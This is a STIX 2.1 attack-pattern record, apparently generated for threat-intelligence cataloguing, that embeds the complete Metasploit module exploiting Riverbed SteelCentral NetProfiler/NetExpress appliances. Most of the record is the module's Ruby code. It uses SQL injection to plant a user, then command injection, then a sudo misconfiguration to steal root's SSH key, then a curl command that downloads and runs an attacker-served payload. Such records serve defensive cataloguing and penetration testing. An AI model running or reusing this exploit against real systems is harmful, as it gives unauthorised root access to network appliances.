{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8cbe6181-9610-464e-b463-5a130d24c9ad",
    "created": "2024-08-14T17:02:07.539957Z",
    "modified": "2024-08-14T17:02:07.539962Z",
    "name": "\"Riverbed SteelCentral NetProfiler/NetExpress Remote Code Execution\"",
    "description": " This module exploits three separate vulnerabilities found in the Riverbed SteelCentral NetProfiler/NetExpress virtual appliances to obtain remote command execution as the root user. A SQL injection in the login form can be exploited to add a malicious user into the application's database. An attacker can then exploit a command injection vulnerability in the web interface to obtain arbitrary code execution. Finally, an insecure configuration of the sudoers file can be abused to escalate privileges to root.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/riverbed_netprofiler_netexpress_exec.rb",
            "external_id": "riverbed_netprofiler_netexpress_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.security-assessment.com/files/documents/advisory/Riverbed-SteelCentral-NetProfilerNetExpress-Advisory.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  require 'digest'\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Riverbed SteelCentral NetProfiler/NetExpress Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits three separate vulnerabilities found in the Riverbed SteelCentral NetProfiler/NetExpress\n        virtual appliances to obtain remote command execution as the root user. A SQL injection in the login form\n        can be exploited to add a malicious user into the application's database. An attacker can then exploit a\n        command injection vulnerability in the web interface to obtain arbitrary code execution. Finally, an insecure\n        configuration of the sudoers file can be abused to escalate privileges to root.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Francesco Oddo <francesco.oddo[at]security-assessment.com>' ],\n      'References'     =>\n        [\n          [ 'URL', 'http://www.security-assessment.com/files/documents/advisory/Riverbed-SteelCentral-NetProfilerNetExpress-Advisory.pdf' ]\n        ],\n      'Platform'       => 'linux',\n      'Arch'           => ARCH_X64,\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'Targets'        =>\n        [\n          [ 'Riverbed SteelCentral NetProfiler 10.8.7 / Riverbed NetExpress 10.8.7', { }]\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2016-06-27',\n      'DefaultTarget'  => 0\n      ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The target URI', '/']),\n        OptString.new('RIVERBED_USER', [true, 'Web interface user account to add', 'user']),\n        OptString.new('RIVERBED_PASSWORD', [true, 'Web interface user password', 'riverbed']),\n        OptInt.new('HTTPDELAY', [true, 'Time that the HTTP Server will wait for the payload request', 10]),\n        Opt::RPORT(443)\n      ],\n      self.class\n    )\n  end\n\n  def check\n    json_payload_check = \"{\\\"username\\\":\\\"check_vulnerable%'; SELECT PG_SLEEP(2)--\\\", \\\"password\\\":\\\"pwd\\\"}\";\n\n    # Verifies existence of login SQLi\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path,'/api/common/1.0/login'),\n      'ctype' => 'application/json',\n      'encode_params' => false,\n      'data'     => json_payload_check\n     })\n\n     if res && res.body && res.body.include?('AUTH_DISABLED_ACCOUNT')\n       return Exploit::CheckCode::Vulnerable\n     end\n\n     Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    print_status(\"Attempting log in to target appliance\")\n    @sessid = do_login\n\n    print_status(\"Confirming command injection vulnerability\")\n    test_cmd_inject\n    vprint_status('Ready to execute payload on appliance')\n\n    @elf_sent = false\n    # Generate payload\n    @pl = generate_payload_exe\n\n    if @pl.nil?\n      fail_with(Failure::BadConfig, 'Please select a valid Linux payload')\n    end\n\n    # Start the server and use primer to trigger fetching and running of the payload\n    begin\n      Timeout.timeout(datastore['HTTPDELAY']) { super }\n    rescue Timeout::Error\n    end\n\n  end\n\n  def get_nonce\n    # Function to get nonce from login page\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path,'/index.php'),\n     })\n\n    if res && res.body && res.body.include?('nonce_')\n       html = res.get_html_document\n       nonce_field = html.at('input[@name=\"nonce\"]')\n       nonce = nonce_field.attributes[\"value\"]\n    else\n       fail_with(Failure::Unknown, 'Unable to get login nonce.')\n    end\n\n    # needed as login nonce is bounded to preauth SESSID cookie\n    sessid_cookie_preauth = (res.get_cookies || '').scan(/SESSID=(\\w+);/).flatten[0] || ''\n\n    return [nonce, sessid_cookie_preauth]\n\n  end\n\n  def do_login\n\n    uname = datastore['RIVERBED_USER']\n    passwd = datastore['RIVERBED_PASSWORD']\n\n    nonce, sessid_cookie_preauth = get_nonce\n    post_data = \"login=1&nonce=#{nonce}&uname=#{uname}&passwd=#{passwd}\"\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path,'/index.php'),\n      'cookie' => \"SESSID=#{sessid_cookie_preauth}\",\n      'ctype' => 'application/x-www-form-urlencoded',\n      'encode_params' => false,\n      'data'     => post_data\n     })\n\n    # Exploit login SQLi if credentials are not valid.\n    if res && res.body && res.body.include?('<form name=\"login\"')\n       print_status(\"Invalid credentials. Creating malicious user through login SQLi\")\n\n       create_user\n       nonce, sessid_cookie_preauth = get_nonce\n       post_data = \"login=1&nonce=#{nonce}&uname=#{uname}&passwd=#{passwd}\"\n\n       res = send_request_cgi({\n         'method' => 'POST',\n         'uri' => normalize_uri(target_uri.path,'/index.php'),\n         'cookie' => \"SESSID=#{sessid_cookie_preauth}\",\n         'ctype' => 'application/x-www-form-urlencoded',\n         'encode_params' => false,\n         'data'     => post_data\n       })\n    else\n       print_good(\"Valid login credentials provided. Successfully logged in\")\n    end\n\n    sessid_cookie = (res.get_cookies || '').scan(/SESSID=(\\w+);/).flatten[0] || ''\n    print_status(\"Saving login credentials into Metasploit DB\")\n    store_valid_credential(user: uname, private: passwd)\n\n    return sessid_cookie\n\n  end\n\n  def create_user\n    # Function exploiting login SQLi to create a malicious user\n    username = datastore['RIVERBED_USER']\n    password = datastore['RIVERBED_PASSWORD']\n\n    usr_payload = generate_sqli_payload(username)\n    pwd_hash = Digest::SHA512.hexdigest(password)\n    pass_payload = generate_sqli_payload(pwd_hash)\n    uid = rand(999)\n\n    json_payload_sqli = \"{\\\"username\\\":\\\"adduser%';INSERT INTO users (username, password, uid) VALUES ((#{usr_payload}), (#{pass_payload}), #{uid});--\\\", \\\"password\\\":\\\"pwd\\\"}\";\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path,'/api/common/1.0/login'),\n      'ctype' => 'application/json',\n      'encode_params' => false,\n      'data'     => json_payload_sqli\n     })\n\n     json_payload_checkuser = \"{\\\"username\\\":\\\"#{username}\\\", \\\"password\\\":\\\"#{password}\\\"}\";\n\n     res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path,'/api/common/1.0/login'),\n      'ctype' => 'application/json',\n      'encode_params' => false,\n      'data'     => json_payload_checkuser\n     })\n\n     if res && res.body && res.body.include?('session_id')\n       print_good(\"User account successfully created, login credentials: '#{username}':'#{password}'\")\n     else\n       fail_with(Failure::UnexpectedReply, 'Unable to add user to database')\n     end\n\n  end\n\n  def generate_sqli_payload(input)\n    # Function to generate sqli payload for user/pass in expected format\n    payload = ''\n    input_array = input.strip.split('')\n    for index in 0..input_array.length-1\n      payload = payload << 'CHR(' + input_array[index].ord.to_s << ')||'\n    end\n\n    # Gets rid of the trailing '||' and newline\n    payload = payload[0..-3]\n\n    return payload\n  end\n\n  def test_cmd_inject\n    post_data = \"xjxfun=get_request_key&xjxr=1457064294787&xjxargs[]=Stoken; id;\"\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path,'/index.php?page=licenses'),\n      'cookie' => \"SESSID=#{@sessid}\",\n      'ctype' => 'application/x-www-form-urlencoded',\n      'encode_params' => false,\n      'data'     => post_data\n     })\n\n    unless res && res.body.include?('uid=')\n      fail_with(Failure::UnexpectedReply, 'Could not inject command, may not be vulnerable')\n    end\n\n  end\n\n  def cmd_inject(cmd)\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path,'/index.php?page=licenses'),\n      'cookie' => \"SESSID=#{@sessid}\",\n      'ctype' => 'application/x-www-form-urlencoded',\n      'encode_params' => false,\n      'data'     => cmd\n     })\n\n  end\n\n  # Deliver payload to appliance and make it run it\n  def primer\n\n    # Gets the autogenerated uri\n    payload_uri = get_uri\n\n    root_ssh_key_private = rand_text_alpha_lower(8)\n    binary_payload = rand_text_alpha_lower(8)\n\n    print_status(\"Privilege escalate to root and execute payload\")\n\n    privesc_exec_cmd = \"xjxfun=get_request_key&xjxr=1457064346182&xjxargs[]=Stoken;  sudo -u mazu /usr/mazu/bin/mazu-run /usr/bin/sudo /bin/date -f /opt/cascade/vault/ssh/root/id_rsa | cut -d ' ' -f 4- | tr -d '`' | tr -d \\\"'\\\" > /tmp/#{root_ssh_key_private}; chmod 600 /tmp/#{root_ssh_key_private}; ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -i /tmp/#{root_ssh_key_private} root@localhost '/usr/bin/curl -k #{payload_uri} -o /tmp/#{binary_payload}; chmod 755 /tmp/#{binary_payload}; /tmp/#{binary_payload}'\"\n\n    cmd_inject(privesc_exec_cmd)\n\n    register_file_for_cleanup(\"/tmp/#{root_ssh_key_private}\")\n    register_file_for_cleanup(\"/tmp/#{binary_payload}\")\n\n    vprint_status('Finished primer hook, raising Timeout::Error manually')\n    raise(Timeout::Error)\n  end\n\n  #Handle incoming requests from the server\n  def on_request_uri(cli, request)\n    vprint_status(\"on_request_uri called: #{request.inspect}\")\n    print_status('Sending the payload to the server...')\n    @elf_sent = true\n    send_response(cli, @pl)\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-06-27",
    "x_mitre_platforms": [
        "linux'"
    ]
}